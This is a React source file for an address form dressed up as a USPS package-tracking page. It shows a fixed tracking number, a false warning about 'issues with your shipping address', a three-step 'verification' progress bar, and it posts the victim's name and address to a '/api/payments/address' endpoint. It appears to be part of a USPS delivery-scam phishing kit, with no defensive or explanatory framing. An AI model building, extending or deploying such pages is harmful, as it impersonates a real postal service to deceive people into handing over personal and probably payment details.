import React, { useState } from 'react';
import axios from 'axios';
import './AddressForm.css';

const AddressForm = ({ formData, handleChange, nextStep, error, setError }) => {
  const [loading, setLoading] = useState(false);

  // List of countries for the dropdown
  const countries = [
    { code: 'US', name: 'United States' },
    { code: 'CA', name: 'Canada' },
    { code: 'GB', name: 'United Kingdom' },
  ];

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const requiredFields = ['firstName', 'lastName', 'country', 'address', 'city', 'zipCode'];
      const missingFields = requiredFields.filter(field => !formData[field]?.trim());
      if (missingFields.length > 0) {
        throw new Error('All fields are required.');
      }
      
      if (formData.country === 'US' && !/^\d{5}$/.test(formData.zipCode)) {
        throw new Error('ZIP code must be 5 digits for US addresses.');
      }

      await new Promise(resolve => setTimeout(resolve, 500));
      const response = await axios.post('/api/payments/address', formData);
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Failed to save address.');
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="usps-tracking-container">
      <div className="tracking-header">
        <h1>Tracking Number: US9514901165421</h1>
        <h2>Status: <span className="status-warning">We have issues with your shipping address</span></h2>
      </div>

      <div className="tracking-message">
        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>
      </div>

      <div className="status-alert">
        <h3>Status Not Available</h3>
        <h4>Verify Address</h4>
        <p>Find an email to confirm your address as eligible for informed Delivery.</p>
      </div>

      <div className="progress-container">
        <div className="progress-bar">
          <div className="progress-line"></div>
          <div className="progress-steps">
            <div className="progress-step active">
              <div className="step-number">1</div>
              <div className="step-label">Address</div>
            </div>
            <div className="progress-step">
              <div className="step-number">2</div>
              <div className="step-label">Verification</div>
            </div>
            <div className="progress-step">
              <div className="step-number">3</div>
              <div className="step-label">Confirmation</div>
            </div>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="address-form">
        {error && <div className="usps-error">{error}</div>}
        
        <div className="form-row">
          <div className="form-group first-name">
            <label>First name</label>
            <input
              type="text"
              name="firstName"
              value={formData.firstName}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
          <div className="form-group last-name">
            <label>Last name</label>
            <input
              type="text"
              name="lastName"
              value={formData.lastName}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
        </div>

        <div className="form-group">
          <label>Country</label>
          <select
            name="country"
            value={formData.country}
            onChange={handleChange}
            required
            disabled={loading}
          >
            <option value="">Select Country</option>
            {countries.map(country => (
              <option key={country.code} value={country.code}>{country.name}</option>
            ))}
          </select>
        </div>

        <div className="form-group">
          <label>Address</label>
          <input
            type="text"
            name="address"
            value={formData.address}
            onChange={handleChange}
            required
            disabled={loading}
          />
        </div>

        <div className="form-row">
          <div className="form-group zip">
            <label>ZIP Code</label>
            <input
              type="text"
              name="zipCode"
              value={formData.zipCode}
              onChange={handleChange}
              required
              disabled={loading}
              pattern={formData.country === 'US' ? '\\d{5}' : undefined}
            />
          </div>
          <div className="form-group city">
            <label>City</label>
            <input
              type="text"
              name="city"
              value={formData.city}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
        </div>

        <div className="form-footer">
          <button type="submit" disabled={loading} className="usps-button">
            {loading ? (
              <>
                <span className="usps-spinner"></span> Processing...
              </>
            ) : 'Continue'}
          </button>
        </div>
      </form>
    </div>
  );
};

export default AddressForm;
